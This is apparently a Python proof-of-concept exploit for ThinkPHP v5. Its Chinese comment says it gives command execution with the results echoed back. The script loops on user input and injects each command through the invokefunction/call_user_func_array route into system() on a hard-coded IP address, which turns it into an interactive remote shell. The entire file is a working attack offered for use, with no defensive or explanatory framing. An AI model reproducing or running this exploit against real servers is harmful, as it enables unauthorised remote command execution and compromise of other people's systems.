'''
针对特定环境的一个thinkphp v5的poc
可实行命令执行+命令结果回显->_->
'''
import requests

while(1):
	command=input("$windy@dashabi=zya:#")
	url="http://219.217.199.67/thinkme/public/index.php"
	poc="?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="+str(command)
	r=requests.get(url+poc)
	'''
	with open('test.txt','w',encoding='utf-8') as f:
		f.write(r.text)
	'''
	print(r.text,end="\n")
